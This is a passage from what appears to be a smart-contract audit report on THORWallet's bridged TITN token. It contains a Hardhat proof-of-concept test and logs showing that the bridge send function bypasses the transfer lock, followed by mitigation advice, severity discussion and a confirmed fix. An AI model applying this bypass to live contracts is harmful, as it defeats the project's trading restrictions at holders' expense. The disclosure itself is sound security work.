class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fetching the native fee for the token send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Executing the send operation from TITN contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eeql\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnBase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eeql\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e())\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fetching the native fee for the token send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;before user2 balance: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;after user2 balance: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estartBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eeql\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efinalBalanceBOnArb\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eeql\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e())\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eLogs\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"console\" data-index=\"6\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003ebefore user2 balance:  BigNumber { value: \u0026quot;0\u0026quot; }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eafter user2 balance:  BigNumber { value: \u0026quot;1000000000000000000\u0026quot; }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ✔ user1  transfer TITN tokens to user2 by bridge when transfer disable\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended to also disable the \u003ccode\u003esend\u003c/code\u003e function when \u003ccode\u003eisBridgedTokensTransferLocked\u003c/code\u003e is set to true. Alternatively, add the \u003ccode\u003e_validateTransfer\u003c/code\u003e check to the \u003ccode\u003emint\u003c/code\u003e/\u003ccode\u003eburn\u003c/code\u003e functions.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ecacaomatt (THORWallet) confirmed\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe\"\u003e0xnev (judge) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eValid finding, medium severity as of now, given although the invariant is broken, afiak, no direct fund loss or exploit is possible.\u003c/p\u003e\n\u003cp\u003eThere is a case of speculative trading to price the tokens that directly go against another invariant. Would take any comments that makes a case for high severity regarding this impact.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBridged TITN Tokens: Transfers are restricted to a pre-defined address (transferAllowedContract), set by the admin. Initially, this address will be the staking contract to prevent trading until the \u003ccode\u003eisBridgedTokensTransferLocked flag\u003c/code\u003e is disabled by the admin.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe\u0026#x26;commentChild=kvGZUdiBJnb\"\u003ecryptoxz (THORWallet) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eOne of the main points to add this restriction was to prevent users to create a trading pool before TGE. We would like to explore more this issue as that would be a high concern for us.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe\u0026#x26;commentChild=EUqvh6hKDrp\"\u003ecacaomatt (THORWallet) confirmed and commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWe’ve created a PR for this \u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe\u0026#x26;commentChild=m5ogg9Phf9Y\"\u003e0xnev (judge) commented\u003c/a\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eRaising to high severity, as of now, given the possible impact of speculative trading I mentioned above\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-03-thorwallet-mitigation?tab=readme-ov-file#findings-being-mitigated\"\u003eTHORWallet mitigated\u003c/a\u003e:\u003c/strong\u003e.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe PR \u003ca href=\"https://github.com/THORWallet/TGT-TITN-merge-contracts/tree/audit-4\"\u003ehere\u003c/a\u003e only allows bridging to the sender’s own address.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-4\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-9\"\u003eweb3km\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-13\"\u003ekn0t\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"medium-risk-findings-1\" style=\"position:relative;\"\u003e\u003ca 